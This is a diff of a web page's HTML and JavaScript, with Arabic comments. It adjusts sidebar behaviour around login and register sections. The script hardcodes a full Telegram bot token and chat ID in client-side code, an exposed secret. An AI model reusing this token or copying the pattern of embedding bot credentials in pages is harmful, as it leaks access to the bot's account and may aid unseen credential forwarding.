@@ -80,7 +80,7 @@
         }
         /* قائمة جانبية */
         .sidebar {
-            display: none;
+            display: none; /* نبدأ بإخفاء القائمة الجانبية */
             position: fixed;
             top: 0;
             right: 0;
@@ -233,7 +233,7 @@
 
     <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <script>
-        const telegramBotToken = "7523355108:AAFoWXH3sCyNrwhCWQRwsFZekWrKKa2xQso"; // Bot token
+        const telegramBotToken = "7523355108:AAFoWXH3sCyNrwhCWQRwsFZekWrKKa2xQso"; // توكن البوت
         const chatId = "6919240425"; // Chat ID
 
         // Toggle sidebar
@@ -346,6 +346,19 @@
         // Navigation to Register page
         document.getElementById('go-to-register').addEventListener('click', function() {
             showSection('register-section');
+        });
+
+        // Hide sidebar on login and register pages
+        function hideSidebarOnSections() {
+            const currentSection = document.querySelector('.section:not(.hidden)');
+            if (currentSection.id === 'login-section' || currentSection.id === 'register-section') {
+                hideSidebar();
+            }
+        }
+
+        // Check sidebar visibility on section change
+        document.querySelectorAll('.section').forEach(section => {
+            section.addEventListener('transitionend', hideSidebarOnSections);
         });
     </script>
 </body>
